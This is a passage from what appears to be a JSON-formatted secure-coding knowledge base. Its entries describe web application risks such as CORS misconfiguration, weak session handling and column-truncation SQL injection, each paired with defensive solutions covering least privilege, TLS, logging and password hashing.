run with higher privileges\n  Compromised user accounts with higher privileges\n\nThese examples just scratch the surface of what attackers will try in order to elevate their privilages on your application/system. Therefore it is very important to take this reccomendation high into account.\n\n Solution:\n\nChecking if a user has enough authorization to execute certain request should always be enforced on the serverside. Also, you may apply the Principle of Least privilege, the principle of least privilege recommends that accounts have the least amount of privilege required to perform their business processes. This encompasses user rights, resource permissions such as CPU limits, memory, network, and file system permissions. For example, if a user only requires access to the network, read access to a database table, and the ability to write to a log, this describes all the permissions that should be granted. Under no circumstances should the user be granted administrative privileges. \n"}, {"kb_id": 110, "title": "Enforce sequential step order", "content": " Description:\n\nWhenever a functionality consists out of following several steps to achieve some goal i.e,\n\nUser adds items to chart > User enters shipping information > User pays for goods > Items will be shipped.\nYou want to make sure the user can not skip the payment step in order to receive his goods.\n\n Solution:\n\nIn order to verify that this stage was run through by a sincere user you want to enforce\nthe application to only process business logic flows in sequential step order, with all\nsteps being processed in realistic human time, and not process out of order, skipped steps,\nprocessed steps from another user, or too quickly submitted transactions.\n\n"}, {"kb_id": 111, "title": "Step up or adaptive authentication", "content": " Description:\n\nWhenever a user browses a section of a webbased application that contains sensitive information the user should be challenged authenticate again using a higher assurance credential to be granted access to this information.\nThis is to prevent attackers from reading sensitive information after they successfully hijacked a user account.\n\n\n Solution:\n\nVerify the application has additional authorization (such as step up or adaptive authentication) so the user is challenged before being granted access to sensitive information. This rule also applies for making critical changes to an account or action.\nSegregation of duties should be applied for highvalue applications to enforce antifraud controls as per the risk of application and past fraud.\n\n"}, {"kb_id": 112, "title": "Cross origin resource sharing", "content": " Description:\n\nCross Origin Resource Sharing or CORS is a mechanism that enables a web browser to perform\n''crossdomain'' requests using the XMLHttpRequest L2 API in a controlled manner.\nIn the past, the XMLHttpRequest L1 API only allowed requests to be sent within the same\norigin as it was restricted by the same origin policy.\n\n Solution:\n\nCrossOrigin requests have an Origin header, that identifies the domain initiating the request and is always sent to the server. CORS defines the protocol to use a web browser and a server to determine whether a crossorigin request is allowed. In order to accomplish this goal, there are a few HTTP headers involved in this process, that are supported by all major browsers:\n\n Origin\n AccessControlRequestMethod\n AccessControlRequestHeaders\n AccessControlAllowOrigin\n AccessControlAllowCredentials\n AccessControlAllowMethods\n AccessControlAllowHeaders\n\nThings you must consider when using CORS\n\n1. Validate URLs passed to XMLHttpRequest.open. Current browsers allow these URLs to be\ncross domain; this behavior can lead to code injection by a remote attacker. Pay extra\nattention to absolute URLs.\n\n2. Ensure that URLs responding with AccessControlAllowOrigin: * do not include any\nsensitive content or information that might aid an attacker in further attacks.\nUse the AccessControlAllowOrigin header only on chosen URLs that need to be\naccessed crossdomain. Don''t use the header for the whole domain.\n\n3. Allow only selected, trusted domains in the AccessControlAllowOrigin header.\nPrefer whitelisting domains over blacklisting or allowing any domain\n(do not use * wildcard nor blindly return the Origin header content without any checks)\n\n4. Keep in mind that CORS does not prevent the requested data from going to an\nunauthenticated location. It''s still important for the server to perform usual\nCSRF prevention.\n\n5. While the RFC recommends a preflight request with the OPTIONS verb, current\nimplementations might not perform this request, so it''s important that \"ordinary\"\n(GET and POST) requests perform any access control necessary.\n\n6. Discard requests received over plain HTTP with HTTPS origins to prevent mixed\ncontent bugs.\n\n7. Don''t rely only on the Origin header for Access Control checks. Browser always sends\nthis header in CORS requests, but may be spoofed outside the browser.\nApplicationlevel protocols should be used to protect sensitive data.\n\n**NOTE:** \nModern application frameworks do dynamically allocation of the origin header, resulting in the browser\nalso allowing to send the \"AccessControlAllowCredentials: true\" header as well in requests. \nWhenever JSON web tokens are being send in cookies rather than headers, potential attackers could abuse this behaviour to \nmake unauthenticated XHR get requests on the authenticated users behalf to read sensitive information from the \npages.\n"}, {"kb_id": 113, "title": "Prevent password pre filling", "content": " Description:\n\nPasswords should never be stored plaintext or in a reversible format on the application. Whenever an attacker hacks \ninto the applications SQL database the passwords are directly compromised. In the case of\nprefilled forms in the application, an attacker could also hijack the credentials by badly\nconfigured CORS rules or XSS attacks.\n\n Solution: \n\nVerify that forms containing credentials are not filled in by\nthe application. Prefilling by the application implies that\ncredentials are stored in plaintext or a reversible format,\nwhich is explicitly prohibited. Passwords should be stored by preferably PBKDF functions.\n\nPBKDF2 uses a pseudorandom function and a configurable number of iterations to derive a\ncryptographic key from a password. Because this process is difficult to reverse\n(similar to a cryptographic hash function) but can also be configured to be slow to \ncompute, key derivation functions are ideally suited for password hashing use cases.\n\nExamples of good ways to store passwords are with, BCRYPT, Blowfish or in some cases SCRYPT\nwhich is a little harder to implement correctly\n\nNOTE: Password prefilling also happens when using the browsers password manager. However this process is different fromt he context described above since the description above implies an application that prefilles credentials from the database/localstorage/etc.\n"}, {"kb_id": 114, "title": "All authentication controls must fail securely", "content": " Description:\n\nHandling errors securely is a key aspect of secure coding.\nThere are two types of errors that deserve special attention. The first is exceptions\nthat occur in the processing of a security control itself. It''s important that these\nexceptions do not enable behavior that the countermeasure would normally not allow.\nAs a developer, you should consider that there are generally three possible outcomes\nfrom a security mechanism:\n\n1. Allow the operation\n2. Disallow the operation\n3. Exception\n\nIn general, you should design your security mechanism so that a failure will follow the same execution path\nas disabling the operation\n\n Solution:\n\nMake sure all the access control systems are thoroughly tested for failing securely before\nusing it in your application. It is common that complete unittest are created especially\nfor this purpose.\n"}, {"kb_id": 115, "title": "Forget password functions", "content": " Description:\n\nWhenever the application provides a password forget functionality or another \ntype of recovery methods there are several implementations of hardened proven ways to make\nthe user recover his password.\n\n Solution:\n\nThe recommended solutions are to use TOTP (Timebased OneTime Password algorithm). This \nmethod is an example of a hashbased message authentication code (HMAC). It combines a \nsecret key with the current timestamp using a cryptographic hash function to generate \na onetime password. Because network latency and outofsync clocks can result in the password \nrecipient having to try a range of possible times to authenticate against, the timestamp typically \nincreases in 30second intervals, which thus cuts the potential search space.\n\nOr the other option is to use a Mathematicalalgorithmbased onetime password method. This other \ntype of onetime password uses a complex mathematical algorithm, such as a hash chain, to generate \na series of onetime passwords from a secret shared key. Each password cannot be guessed even when \nprevious passwords are known. The open source OAuth algorithm is standardized; other algorithms are \ncovered by U.S. patents. Each password is observably unpredictable and independent on previous ones. \nTherefore, an adversary would be unable to guess what the next password may be, even with the \nknowledge of all previous passwords.\n\nExample of a hard token mathimatical algorithm would be a yubikey\nExample of a soft token TOTP would be google authenticator\n\nThe last resort would be to send a new password by email. This mail should contain a reset link with \na token which is valid for a limited amount of time. Additional authentication based on softtokens \n(e.g. SMS token, native mobile applications, etc.) can be required as well before the link is \nsent over. Also, make sure whenever such a recovery cycle is started, the application does not \nreveal the user\u2019s current password in any way.\n"}, {"kb_id": 116, "title": "Aggregate access control protection", "content": " Description:\n\nVerify the system can protect against aggregation or continuous access of\nsecured functions, resources, or data. For example, possibly by the use of a\nresource governor to limit the number of edits per hour or to prevent the entire database\nfrom being scraped by an individual user.\n\n Solution:\n\nThe system should contain a counter which can keep up with the number of times a certain\nusers addresses database tables and should be rejected when he passes a reasonable number.\nThis violation should also be reported since it could indicate an attacker scraping your\ntable contents and stealing company information.\n"}, {"kb_id": 117, "title": "Canonicalized user input", "content": " Description:\n\nWhenever userinput is partially validated there is a high probability that the application\nmisses a malicious input which could execute a successful attack on your application.\n\n Solution:\n\nAll userinput should be validated whenever the userinput string is complete and is being\nprocessed by your application.\n"}, {"kb_id": 118, "title": "Approved random number generator", "content": " Description:\n\nThe lack of entropy available for, or used by, a pseudorandom number generator can be a\nstability and security threat.\n\n Solution:\n\nAll random numbers, random file names, random GUIDs, and random must be generated using\nthe cryptographic module''s approved random number generator when these random values are\nintended to be unguessable/unpredictable by an attacker.\n"}, {"kb_id": 119, "title": "Validated cryptographic modules", "content": " Description:\n\nThe National Institute of Standards and Technology (NIST) issued the FIPS 140 Publication\nSeries to coordinate the requirements and standards for cryptography modules that include\nboth hardware and software components. Protection of a cryptographic module within a\nsecurity system is necessary to maintain the confidentiality and integrity of the\ninformation protected by the module.\n\n Solution:\n\nVerify that cryptographic modules used by the application have been validated against\nFIPS 1402 or an equivalent standard.\n"}, {"kb_id": 121, "title": "Policy for managing cryptographic keys", "content": " Description:\n\nWhen there is no policy for managing your cryptographic keys, expired or revoked keys\nthat could unknowingly be used again thus becoming a threat for your encrypted data.\n\n Solution:\n\nVerify that there is an explicit policy for how cryptographic keys are managed\n(e.g., generated, distributed, revoked, expired). Verify that this policy is properly\nenforced.\n"}, {"kb_id": 122, "title": "HTTPS and weakly or unencrypted links", "content": " Description:\n\nImagine the scenario where you have a login form and an application which supports HTTPS.\nWhenever the initial connection (login.php) is not HTTPS and after login (loggedin.php)\nwill be HTTPS the username and password will not be sent through an encrypted manner thus\ncould be easily compromised by attackers. This principle also applies to sending\nvulnerable data towards other unencrypted/weak encrypted links in your application.\n\n Solution:\n\nVerify that credentials or other sensitive information is transported via TLS.\n"}, {"kb_id": 123, "title": "Error handling on trusted devices", "content": " Description:\n\nWhenever error handling is not applied through trusted devices the errors it supplies can\nnot be trusted since they can be tampered with.\n\n Solution:\n\nVerify that all error handling is performed on trusted devices.\n"}, {"kb_id": 124, "title": "Single application level logging", "content": " Description:\n\nWhenever the application contains a single applicationlevel logging implementation it\nbecomes clear, transparent and easy to maintain. It also reduces the possibility that you\noverlook high priority logging.\n\n Solution:\n\nVerify that there is a single applicationlevel logging implementation that is used by\nthe software.\n"}, {"kb_id": 125, "title": "Aggregate user requests", "content": " Description:\n\nVerify the system can protect against aggregation or continuous access to functions,  \nresources, or data. For example, possibly by the use of a resource governor to limit the\nnumber of edits per minute in order to to prevent an automatic attack\n\n Solution:\n\nVerify the application has the ability to detect and alert on abnormal numbers of requests\nfor information or processing highvalue transactions for that user role, automated use of web service extraction, or data loss prevention. For example, the average user should not be able to access more than 5 records per hour or 30 records\nper day or add 10 friends to a social network per minute.\n"}, {"kb_id": 126, "title": "Principle of least privilege", "content": " Description:\n\nThe principle of least privilege recommends that accounts have the least amount of\nprivilege required to perform their business processes. This encompasses user rights,\nresource permissions such as CPU limits, memory, network, and file system permissions.\n\n Solution:\n\nThe principle means giving a user account only those privileges which are essential to\nthat user\u2019s work. For example, a backup user does not need to install software: hence,\nthe backup user has rights only to run backup and backuprelated applications.\nAny other privileges, such as installing new software, are blocked.\n\nThe principle applies also to a personal computer user who usually does work in a normal\nuser account, and opens a privileged, password protected account (that is, a superuser)\nonly when the situation absolutely demands it.\n\nThis principle can also be applied to your webapplications. Instead of solely depending\non role based authentication methods using sessions, we rather want to assign privileges\nto users by means of a DatabaseBased Authentication system.\n\nWe still use sessions in order to identify if the user was logged in correctly, only now\ninstead of assigning that user with a specific role we assign him with privileges to\nverify which actions he is privileged to perform on the system.\n\nAlso, a big pro of this method is, whenever a user has to be assigned fewer privileges\nyour changes will be applied on the fly since the assigning does not depend on the session\nwhich otherwise had to expire first.\n"}, {"kb_id": 127, "title": "TLS implementation must operate in an approved mode of operation", "content": " Description:\n\nTo enforce the maximum amount of security out of the TLS implementation it should always\nsuffice the approved mode of operation.\n\n Solution:\n\nSee See http://csrc.nist.gov/groups/STM/cmvp/documents/fips1402/FIPS1402IG.pdf\nfor more extended details on how to reach this goal.\n"}, {"kb_id": 128, "title": "Character encoding", "content": " Description:\n\nCharacter encoding is the process of mapping characters, numbers and other symbols to a\nstandard format. Typically, this is done to create a message ready for transmission\nbetween sender and receiver. It is, in simple terms, the conversion of characters\n(belonging to different languages like English, Chinese, Greek or any other known language)\ninto bytes. An example of a widely used character encoding scheme is the American\nStandard Code for Information Interchange (ASCII) that initially used 7bit codes.\nMore recent examples of encoding schemes would be the Unicode UTF8 and UTF16 computing\nindustry standards. In the space of application security and due to the plethora of\nencoding schemes available, character encoding has a popular misuse. It is being used for\nencoding malicious injection strings in a way that obfuscates them. This can lead to the\nbypass of input validation filters, or take advantage of particular ways in which browsers\nrender encoded text.\n\n Solution:\n\nWhen trying to figure out the character encoding of a resource, user agents will try, in\nthis order:\n\n The HTTP ContentType header sent by the server\n The XML declaration (only for XHTML documents)\n HTML/XHTML meta element.\n\nMake sure this information is provided by your application for the server in order to\nprevent it from guessing the wrong encoding standard, leaving room for injection.\n\n Note:\n\nThese three ways of providing the character encoding of a document are not\nequivalent.\n"}, {"kb_id": 129, "title": "HTTP request methods", "content": " Description:\n\nHTTP offers a number of methods that can be used to perform actions on the web server.\nMany of these methods are designed to aid developers in deploying and testing\nHTTP applications. These HTTP methods can be used for nefarious purposes if the web\nserver is misconfigured. It recommended to read about the different available methods, their purposes and\nlimitations.\n\nAvailable method are:\n\nGET\nThe GET method requests a representation of the specified resource. Requests using GET should only retrieve data and should have no other effect. (This is also true of some other HTTP methods.)[1] The W3C has published guidance principles on this distinction, saying, \"Web application design should be informed by the above principles, but also by the relevant limitations.\n\nHEAD\nThe HEAD method asks for a response identical to that of a GET request, but without the response body. This is useful for retrieving metainformation written in response headers, without having to transport the entire content.\n\nPOST\nThe POST method requests that the server accept the entity enclosed in the request as a new subordinate of the web resource identified by the URI. The data POSTed might be, for example, an annotation for existing resources; a message for a bulletin board, newsgroup, mailing list, or comment thread; a block of data that is the result of submitting a web form to a datahandling process; or an item to add to a database.\n\n\nPUT\nThe PUT method requests that the enclosed entity be stored under the supplied URI. If the URI refers to an already existing resource, it is modified; if the URI does not point to an existing resource, then the server can create the resource with that URI.\n\n\nDELETE\nThe DELETE method deletes the specified resource.\n\n\nTRACE\nThe TRACE method echoes the received request so that a client can see what (if any) changes or additions have been made by intermediate servers.\n\nOPTIONS\nThe OPTIONS method returns the HTTP methods that the server supports for the specified URL. This can be used to check the functionality of a web server by requesting ''*'' instead of a specific resource.\n\nCONNECT\nThe CONNECT method converts the request connection to a transparent TCP/IP tunnel, usually to facilitate SSLencrypted communication (HTTPS) through an unencrypted HTTP proxy.\n\nPATCH\nThe PATCH method applies partial modifications to a resource.\n\nSome of the methods (for example, GET, HEAD, OPTIONS and TRACE) are, by convention, defined as safe, which means they are intended only for information retrieval and should not change the state of the server. In other words, they should not have side effects, beyond relatively harmless effects such as logging, web caching, the serving of banner advertisements or incrementing a web counter. Making arbitrary GET requests without regard to the context of the application''s state should therefore be considered safe. However, this is not mandated by the standard, and it is explicitly acknowledged that it cannot be guaranteed.\n\nDespite the prescribed safety of GET requests, in practice their handling by the server is not technically limited in any way. Therefore, careless or deliberate programming can cause nontrivial changes on the server. This is discouraged, because it can cause problems for web caching, search engines and other automated agents, which can make unintended changes on the server. For example, a website might allow deletion of a resource through a URL such as http://example.com/article/1234/delete, which, if arbitrarily fetched, even using GET, would simply delete the article.\n\nBy contrast, methods such as POST, PUT, DELETE and PATCH are intended for actions that may cause side effects either on the server, or external side effects such as financial transactions or transmission of email. Such methods are therefore not usually used by conforming web robots or web crawlers; some that do not conform tend to make requests without regard to context or consequences.\n\nMethods PUT and DELETE are defined to be idempotent, meaning that multiple identical requests should have the same effect as a single request (note that idempotence refers to the state of the system after the request has completed, so while the action the server takes (e.g. deleting a record) or the response code it returns may be different on subsequent requests, the system state will be the same every time). Methods GET, HEAD, OPTIONS and TRACE, being prescribed as safe, should also be idempotent, as HTTP is a stateless protocol.\n\nIn contrast, the POST method is not necessarily idempotent, and therefore sending an identical POST request multiple times may further affect state or cause further side effects (such as financial transactions). In some cases this may be desirable, but in other cases this could be due to an accident, such as when a user does not realize that their action will result in sending another request, or they did not receive adequate feedback that their first request was successful. While web browsers may show alert dialog boxes to warn users in some cases where reloading a page may resubmit a POST request, it is generally up to the web application to handle cases where a POST request should not be submitted more than once.\n\nNote that whether a method is idempotent is not enforced by the protocol or web server. It is perfectly possible to write a web application in which (for example) a database insert or other nonidempotent action is triggered by a GET or other request. Ignoring this recommendation, however, may result in undesirable consequences, if a user agent assumes that repeating the same request is safe when it is not.\n\nThe TRACE method can be used as part of a class of attacks known as crosssite tracing; for that reason, common security advice is for it to be disabled in the server configuration. Microsoft IIS supports a proprietary \"TRACK\" method, which behaves similarly, and which is likewise recommended to be disabled\n\n Solution:\n\nVerify that the application accepts only a defined set of HTTP request methods, such as\nGET and POST and unused methods are explicitly blocked/disabled.\n"}, {"kb_id": 130, "title": "Verbose version information", "content": " Description:\n\nRevealing system data or debugging information helps an adversary learn about the system\nand form a plan of attack. An information leak occurs when system data or debugging\ninformation leaves the program through an output stream or logging function.\n\n Solution:\n\nVerify that the HTTP headers do not expose detailed version information of system components. For each different type of server, there are hardening guides dedicated especially for this type of data leaking. The same applies for i.e any other leak of version information such as the version of your programming language or other services running to make your application function.\n"}, {"kb_id": 131, "title": "HTTP headers added by a frontend", "content": " Description:\n\nThere are some kind of headers that uses tokens such as Bearer or JWT which are signed or calculated using a key, by the server that creates it.\n\n Solution:\n\nVerify the integrity and authenticity of the HTTP headers added by a trusted proxy or SSO devices by checking the digital signature or by recalculating the hash or integrity method using a private key or passphrase.\n"}, {"kb_id": 132, "title": "Session management control", "content": " Description:\n\nThe ability to restrict and maintain user actions within unique sessions is critical to\nweb security. Most users of this guide will be using an application framework with built\nin session management capabilities. Others will use languages such as Perl CGI that do not.\nThose without a built in session management system and those who override the existing\nsession management systems are at an immediate disadvantage. Implementations built from\nscratch are often weak and breakable. Developers are strongly discouraged from\nimplementing their own Session Management.\n\n Solution:\n\nAlways use the frameworks default session management control implementation in your application. \nIf not possible you should find hardened guides in how to accomplish this in a secure manner.\n"}, {"kb_id": 133, "title": "Available log analysis tools", "content": " Description:\n\nWith a log analysis tool in place, you can easily and quickly do forensics as soon as you\nnotice your application is under attack by attackers and block them out.\n\n Solution:\n\nA list of recommended tools by OWASP you can find at\nhttps://www.owasp.org/index.php/Log_review_and_managementLogging_Tools\n"}, {"kb_id": 134, "title": "Distinguish log", "content": " Description:\n\nWhenever log fields are distinguished from each other by means of logs from trusted and\nuntrusted log fields in your log entries your logs become clearer and more transparent.\n\n Solution:\n\nVerify that log fields from trusted and untrusted sources are distinguishable in\nlog entries. If possible it is highly recommended that you separate these files\nentirely from each other so the logs with untrusted userinput cannot corrupt the\nsystem generated logs.\n\n"}, {"kb_id": 135, "title": "Sanitise sensitive data rapidly from memory", "content": " Description:\n\nWhenever sensitive data is rapidly removed from the systems\u2019 memory, this decreases the possibility the attacker has to compromise this data by means of memory dumping attacks.\n\n Solution:\n\nVerify that sensitive data is rapidly sanitized from memory as soon as it is no longer needed and handled in accordance with functions and techniques supported by the framework/library/operating system.\n"}, {"kb_id": 136, "title": "Logging is performed before executing the transaction", "content": " Description:\n\nWhenever the logging is performed before executing a transaction you can be ensured that\nthe transactions are logged. This increases the integrity of your log files.\nIf logging is performed after executing a transaction and an attacker does a succcessful attack, then the logging part may not be reached and no trace would be recorded for the attack.\n\n Solution:\n\nVerify that logging is performed before executing the transaction. If logging was\nunsuccessful (e.g. disk full, insufficient permissions) the application fails safe.\nThis is for when integrity and nonrepudiation is a must.\n"}, {"kb_id": 137, "title": "Verify integrity using checksums", "content": " Description:\n\nAlways use checksums when working with interpreted code, libraries, executables,\nand configuration files, when these checksums do not match you can determine that\nthese files are corrupted or backdoored.\n\n Solution:\n\nVerify that the integrity of interpreted code, libraries, executables, and configuration\nfiles is verified using checksums or hashes (not MD5).\n"}, {"kb_id": 138, "title": "Deny access from remote resources or systems", "content": " Description:\n\nYou should always fend off remote connections with untrusted systems/resources which try to\nconnect to your application in order to prevent connecting to malicious systems that try\nto attack your application.\n\n Solution:\n\nSince this is very difficult to achieve on application level we recommend implementing\nEGRESS firewall rules.\n"}, {"kb_id": 139, "title": "Certificate paths revocation information", "content": " Description:\n\nWhenever your certificate authority is not trusted anymore you should always be able to\nrecall these certificates ASAP to prevent man in the middle attacks on your applications users.\n\n Solution:\n\nThe trust anchor for given zone is found in the keyset<zone name> file on the secure\nsigning computer in the same location where the signed and unsigned copies of the zone reside.\nThis file is created automatically as part of the signing process.\nA certificate revocation list (CRL) is a list, created and signed by a\ncertificate authority (CA), which contains serial numbers of certificates that have been\nissued by that CA and are currently revoked. In addition to the serial number of the\nrevoked certifications, the CRL also contains the reason for revocation for each certificate\nand the time the certificate was revoked. The serial number for each revoked certificate is\nkept in the CAs database and published in the CRL until the certificate expires.\n\nAfter the revoked certificate is expired, the certificates entry in the CRL is removed and\nthe CA may remove the certificate from its database. Typically, the revoked certificate\nwill remain in the CRL for one publication period after the certificate expires. By all\ntimes you should have this information in reach in order to take quick actions.\n"}, {"kb_id": 140, "title": "HTML Caching and client side caching", "content": " Description:\n\nDevelopers creating HTML5 applications can create fully offlineaware applications using\nthe HTML5 ApplicationCache interface. The Application Cache uses a cache manifest file to\nspecify which files in an HTML5 application can be used offline, and which files require a\nnetwork connection.\n\n Solution:\n\nNever store sensitive information in a client side cache since this can be easily\ncompromised by attackers. The same principle does also apply to autocomplete functions.\n\nRecommended knowledge base item:\n\n Caching headers\n Client side storage\n"}, {"kb_id": 141, "title": "Cryptographic modules should operate in their approved mode according to their published security policies", "content": " Description:\n\nWhenever cryptographic modules do not operate in their approved mode according to their\npublished security policies these methods could become weak and become inadequate to\nensure strong ciphers.\n\n Solution:\n\nAlways verify that cryptographic modules operate in their approved mode according to\ntheir published security policies before implementing them into your application.\n"}, {"kb_id": 142, "title": "Sending data parameters to untrusted devices", "content": " Description:\n\nWhenever an application sends data/parameters to untrusted devices this data could be\ncompromised if the device has malicious intents.\n\n Solution:\n\nVerify the application minimizes the number of parameters sent to untrusted systems,\nsuch as hidden fields, Ajax variables, cookies and header values.\n\nThese untrusted devices should also be documented if possible and should be taken into\naccount when developing your application to minimize the possibility you send\nunintended sensitive data towards these devices.\n\nRecommended knowledge base items:\n\n Highlevel architecture should be defined\n Identify all application components\n"}, {"kb_id": 143, "title": "Proces high value business logic flows in a trusted environment", "content": " Description:\n\nWhenever highvalue business logic flows are processed in a trusted monitored environment\nit reduces the movability of an attacker and chances of succeeding to\nperform successful attacks. If an attacker should breach your application his actions\ncould be rapidly followed and countermeasures could be taken.\n\n Solution:\n\nVerify the application processes or verifies all highvalue business logic flows in a\ntrusted environment, such as on a protected and monitored server.\n"}, {"kb_id": 144, "title": "Data from untrusted sources", "content": " Description:\n\nWhenever data from untrusted servers is executed by your application there is a high\nprobability this data could be contaminated with malicious code. Such as for example\nXSS from JSON files, or XXE when parsing XML files.\n\n Solution:\n\nVerify the application code does not execute uploaded data obtained from untrusted sources.\nYou could consider sandboxing this data when showing the content on your application.\n\nNOTE: Sandboxing however does not stop an XXE attack. So it is highly recommended to\nalso encode or escape all data entering your application from third party sources.\n"}, {"kb_id": 145, "title": "User restriction for sensitive data", "content": " Description:\n\nAlways enforce multiple layers of security whenever you want to protect sensitive data/files\non your application. If one layer should fail the other layers should prevent the attackers\nfrom succeeding.\n\n Solution:\n\nWhenever sensitive data is stored on the server store the data in a separate folder with permission rules in order to prevent unauthorized users from reading the files. As an indepth solution, you could also check if the session of the user has sufficient privileges to read the files according to the level of authorization.\nRecommended knowledge base item:\n\u2022\tMissing authentication or authorization\n\u2022\tSanitize sensitive data rapidly from memory\n\n"}, {"kb_id": 146, "title": "Runtime environment", "content": " Description:\n\nWhenever you use runtime environments you want to make sure these are not susceptible for\nbuffer overflows since this could lead to compromise of your application.\n\n Solution:\n\nThere are a number of runtime solutions that can detect stack corruption and buffer\noverruns or guard against attacks. These solutions typically terminate the program\nwhen an anomaly is detected, preventing the execution of arbitrary code.\n"}, {"kb_id": 147, "title": "Automatic parameter binding", "content": " Description:\n\nIf the application framework allows automatic mass parameter assignment\n(also called automatic variable binding) from the inbound request to a model,\nverify that security sensitive fields such as ''accountBalance'', ''role'' or ''password''\nare protected from malicious automatic binding. Whenever your application takes parameters\nin HTTPs GET statement and passes them as variables to code within the application this\ncould become a safety hazard since the application processes these variables\nin his operations.\n\n Solution:\n\nWhen working with automatic variable binding you should create whitelists of what\nparameters are expected and allow only these parameters to be passed into your\napplication operation.\n"}, {"kb_id": 148, "title": "Cryptographic function implementation", "content": " Description:\n\nWhenever a cryptographic function is not implemented on the server side then these\ncryptographic functions could easily be bypassed by an attacker.\n\n Solution:\n\nVerify that all cryptographic functions used to protect secrets from the application\nuser are implemented server side.\n"}, {"kb_id": 149, "title": "Cryptographic modules must fail securely", "content": " Description:\n\nWhenever a cryptographic module does not fail securely this the device needs to be put in\nerror state so it''s not useable anymore.\n\n Solution:\n\nWe recommend using the National Institute of Standards and Technology (NIST) standard on testing the cryptographic module making it perform the selftests to see if it fails securely.\n"}, {"kb_id": 150, "title": "Access to any master secret must be protected from unauthorized access", "content": " Description:\n\nAccess to any master secret must be protected from unauthorized access in order to protect\nthe integrity and the confidentiality of the data.\n\n Solution:\n\nWhenever sensitive data is stored on the server you should consider storing this data in a separate folder with permission rules in order to prevent unauthorized users from reading these files. It is also highly recommended to encrypt/hash the password in order to enforce higher security.\n"}, {"kb_id": 151, "title": "Enforce policys for sensitive data processing", "content": " Description:\n\nWhen you process data you should always enforce policies for the transfer of sensitive data in order to enforce a higher level of security imposing structured thresholds to fend off attackers.\n\n Solution:\n\nFirst, you have to create a list which contains locations of where all sensitive data is used and processed. Next, you create a policy that tells who is allowed and to what extent they have privileges to look into which data. When this data moves through the network it should always be encrypted (TLS) and also be stored encrypted. Thereafter you should establish monitoring and testing methods to verify that everything stays encrypted and your policies are properly enforced.\nAlso, determine whenever data storage is necessary or becomes a redundancy. Whenever sensitive data does not have to be stored don''t store it. This reduces the quantity of data may your application ever be compromised.\nUltimately, verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required.\nSensitive data or primary keys, such as personally identifiable information or credit cards should also be anonymized, masked or truncated on the server before transmission to the client.\n\n"}, {"kb_id": 152, "title": "Access control pattern", "content": " Description:\n\nFor successful access control/login functionality there are a lot of things to take into\nconsideration before you start developing this type of functionality.\n\n Solution:\n\nIt is highly recommended to study all the listed items and implement these principles in\nyour access control/login system in order to enforce a higher level of security.\n\n1. Audit logs\n2. Principle of least privilege (Privilege based authentication system)\n3. Passwords must be encrypted, salted and stretched\n4. CrossSite Request Forgery (CSRF for authenticated forms)\n5. Session pattern\n6. Session fixation\n7. Session hijacking\n8. Forget password functions\n9. Client side authentication\n10. Client side state management\n11. Cross subdomain cookie attack\n"}, {"kb_id": 153, "title": "Password forget pattern", "content": " Description:\n\nWhenever you are implementing a forgot password function into your system there are\na few things you need to take into consideration in order to prevent security flaws\nin your application.\n\n1. Forget password functions\n2. Denial of service by locking out accounts\n3. Username enumeration\n4. Does The application enforce the use of secure passwords\n5. Disallow the use of old passwords\n\n Solution:\n\nThe first thing is verify the password has been forgotten and other recovery paths send a link including a timelimited activation token rather than the password itself.\nAdditional authentication based on softtokens (e.g. SMS token, native mobile applications, etc.) can be required as well before the link is sent over.\nSecond, you should not lock out the user\u2019s account whilst the process of getting a new password is in progress. This could lead to a Denial of service attack whenever an attacker decides to intentionally lock out the users with an automated attack.\nThird, whenever the new password request was set in progress, the message you display should be generalized in order to prevent username enumeration.\nFourth, always disallow the use of old passwords and implement a strong password policy.\n\n"}, {"kb_id": 154, "title": "Sessions pattern", "content": " Description:\n\nWhen working with sessions there are a couple of things you need to consider in order to implement them securely throughout your system. For more detailed information about these items you should check the knowledgebase about:\n1.\tSession management control\n2.\tSession cookies without the Secure flag\n3.\tSession cookies without the HTTP Only flag\n4.\tExternal session hijacking\n5.\tInsecure transmission of session cookies\n6.\tSession information is not stored server side\n7.\tSession ids should be generated with sufficient entropy, the preferred method is the frameworks default session management control implementation is used by the application\n8.\tUser generated session ids should be rejected by the server\n9.\tThe logout functionality should revoke the complete session\n10.\tThe login functionality should always generate (and use) a new session id\n11.\tSession IDs do not timeout.(idle)\n12.\tAbsolute session timed out\n13.\tVerify that the session id is never disclosed\n14.\tSession cookies (Domain)\n\n Solution:\n\nThe items as pointed out before should be looked into and taken into consideration\nwhenever you are working with sessions on your system in order to enforce a\nhigh level of security.\n\nThough there are more than ten design patterns related to session, all of them need to be implemented. \nIf any one is left out for implementation, the whole session management layer is not secure and could be defeated by attackers.\n"}, {"kb_id": 155, "title": "Submit forms pattern", "content": " Description:\n\nWhenever a user can submit a form in your system you should consider implementing\nthe following defense mechanism in order to ensure highlevel security.\n\n1.  Single user input validation controls and Audit logs\n2.  CSRF tokens\n3.  Principle of least privilege\n4.  GET/POST requests\n\n Solution:\n\nHere are the steps described briefly.\nFor more detailed information you should look into these items in the knowledge base.\n\nFirst, you should create a single user input validation control class which should\nvalidate the expected input values in order to verify if the user is not tampering data\nor is injecting malicious code into your application. All infringements should be logged\nand repercussions should be taken whenever these infringements are frequent.\n\nSecond, whenever an authenticated user is submitting the form always ensure the forms contain CSRF tokens in order to prevent crosssite request forgery.\nThird, Whenever there are authenticated users with different roles/privileges you should enforce restrictions on the server side upon your form submits/processing in order to prevent privilege escalation. You should apply the principle of least privilege in order to ensure a higher level of security.\nFourth, Whenever the application is sending sensitive data through the form submit this data must always be sent through a POST variable instead of a GET since a GET will leak this data through the URL by example the referrer header.\n\n"}, {"kb_id": 156, "title": "SQL injection Column truncation", "content": " Description:\n\nWhenever an applications structural logic mismatches with the database structural logic an attacker gains the opportunity to truncate his submit towards your database column by submitting a value longer than the limit allowed in the database.\nImagine you have a system where users can register themselves.\n\nThe attacker can abuse this behavior of the database to overflow the length limit and truncate his submit and register himself as the admin, thus gaining its privileges.\n\n\n Solution:\n\nOn critical places where unique values are enforced and expected,\nsuch as usernames in order to authorize or distribute certain privileges. The users submit\nshould be checked on the server side in order to verify if it does not exceed the limit\nset in your database.\n"}, {"kb_id": 157, "title": "User registration pattern", "content": " Description:\n\nWhenever you allow users to register on your system there are a couple of things you need\nto take into consideration in order to enforce a high level of security\nFor more detailed information about these items you should check the knowledgebase about:\n\n1.\tColumn Truncation SQL injection(for MySQL databases)\n2.\tSingle input validation controls\n3.\tAudit logs\n4.\tPrevent password leaking\n5.\tPredictable password and or token generation\n6.\tAre all passwords hashed, salted and stretched\n7.\tDoes the application 